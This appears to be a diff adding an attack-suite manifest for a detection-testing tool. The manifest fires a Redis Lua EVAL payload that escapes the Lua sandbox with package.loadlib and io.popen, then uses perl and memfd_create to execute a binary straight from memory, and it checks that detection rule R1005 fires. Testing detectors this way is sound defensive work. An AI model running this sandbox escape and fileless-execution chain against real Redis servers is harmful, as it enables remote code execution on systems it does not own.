@@ -1,0 +1,39 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: redis-attack-01-fileless-memfd
+  description: "Fileless execution via memfd_create + execve. Triggers R1005."
+target:
+  service: redis
+  namespace: redis
+  port: 6379
+  protocol: redis
+attacks:
+  - name: fileless-memfd-exec
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return 'sandbox_blocked' end
+        local cmd = "perl -e 'my $n=\"bob\\0\";my $fd=syscall(319,$n,0);die if $fd<0;open(my $s,\"<:raw\",\"/bin/cat\");open(my $d,\">&=\",$fd);binmode $d;my $b;while(read($s,$b,8192)){print $d $b}close $s;exec{\"/proc/self/fd/$fd\"}\"cat\",\"/etc/hostname\"'"
+        local f = io_mod.popen(cmd)
+        if not f then return 'popen_failed' end
+        local out = f:read('*a')
+        f:close()
+        return 'fileless:' .. out
+    successIndicators:
+      - responseContains: "fileless:"
+expectedDetections:
+  - attackType: fileless
+    ruleID: R1005
+    ruleName: "Fileless execution detected"
+    containerName: redis
